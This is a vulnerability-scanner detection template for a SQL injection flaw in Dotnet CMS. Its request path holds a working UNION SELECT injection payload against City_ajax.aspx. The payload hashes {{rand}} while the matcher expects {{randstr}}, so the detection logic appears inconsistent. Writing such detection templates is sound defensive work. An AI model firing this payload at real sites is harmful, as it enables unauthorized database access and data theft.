id: "dotnetcms-sqli"
name: "Dotnet CMS - SQL Injection"
severity: "critical"
description: "Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site."
tech:
  - "dotnet"
  - "iis"
tags:
  - "dotnetcms"
  - "dotnet"
  - "sqli"
  - "intrusive"
  - "vuln"
cwe: "CWE-89"
reference: "https://www.cnblogs.com/rebeyond/p/4951418.html"
spaExclusion: true
request:
  method: "GET"
  path: "/user/City_ajax.aspx?CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{rand}}')),2--"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "{{md5(\"{{randstr}}\")}}"
  - type: "status"
    status:
      - 200
